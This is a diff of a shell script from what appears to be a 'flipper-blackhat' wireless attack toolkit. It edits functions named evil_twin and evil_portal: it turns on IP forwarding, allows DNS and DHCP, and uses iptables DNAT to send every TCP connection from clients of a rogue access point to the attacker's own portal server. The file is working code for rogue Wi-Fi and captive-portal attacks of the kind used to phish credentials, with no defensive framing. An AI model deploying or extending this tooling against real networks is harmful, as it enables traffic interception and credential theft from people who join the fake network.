@@ -81,24 +81,36 @@ function evil_twin() {
     iptables --append FORWARD --in-interface $AP_NIC -j ACCEPT
 }
 
-# Before calling this, both start_ap and connect_wifi
-# should have been called.
 function evil_portal() {
     INET_NIC=$(cat /run/inet_nic 2>/dev/null) || { echo "Connect to WiFi first"; exit 1; }
     AP_NIC=$(cat /run/ap_nic 2>/dev/null) || { echo "Create AP first"; exit 1; }
 
-    # echo 1 > /proc/sys/net/ipv4/ip_forward
+    echo 1 > /proc/sys/net/ipv4/ip_forward
     
     # NAT traffic clients to the internet
     # iptables -t nat -A POSTROUTING -o $AP_INET -j MASQUERADE
 
-    # Redirect traffic from the AP nic to evil portal
     iptables -F
+
+    # Allow an initial DNS quiery to happen
     iptables -A FORWARD -i $AP_NIC -p tcp --dport 53 -j ACCEPT
     iptables -A FORWARD -i $AP_NIC -p udp --dport 53 -j ACCEPT
+
+    # Allow incoming DHCP requests (from clients to the router)
+    iptables -A INPUT -p udp --dport 67:68 -j ACCEPT
+
+    # Allow outgoing DHCP responses (from the router to clients)
+    iptables -A OUTPUT -p udp --sport 67:68 -j ACCEPT
+
+    # Allow forwarded DHCP traffic (if the router acts as a relay or bridge)
+    iptables -A FORWARD -p udp --dport 67:68 -j ACCEPT
+
+    # Restrict just http data to port 80 to flipper blackhat IP
     iptables -A FORWARD -i $AP_NIC -p tcp --dport 80 -d $AP_IP -j ACCEPT
+
     iptables -A FORWARD -i $AP_NIC -j DROP
-    iptables -t nat -A PREROUTING -i $AP_NIC -p tcp --dport 80 -j DNAT --to-destination $AP_IP:80
+
+    iptables -t nat -A PREROUTING -i $AP_NIC -p tcp -j DNAT --to-destination $AP_IP
     # iptables -A FORWARD -i $AP_NIC -o $AP_NIC -j ACCEPT
 
     kill $(pidof httpd) 2>/dev/null
@@ -204,7 +216,7 @@ case "$subcommand" in
     pull)
         scp machinehum@192.168.1.103:/home/machinehum/projects/flipper-blackhat-os/package/blackhat/src/blackhat.conf /mnt/
         scp machinehum@192.168.1.103:/home/machinehum/projects/flipper-blackhat-os/package/blackhat/src/blackhat.sh /tmp/bh
-        mv /tmp/bh /usr/bin/bh
+        echo "run: mv /tmp/bh /usr/bin/bh"
         ;;
     *)
         print_help
